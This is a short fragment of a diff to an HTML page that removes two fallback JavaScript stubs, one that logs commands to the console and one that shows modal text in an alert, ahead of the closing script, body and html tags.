-    window.cmd = window.cmd || function(c) { console.warn('cmd:', c); };
-    window.openModal = window.openModal || function(t) { alert(t); };
 </script>
 </body>
 </html>
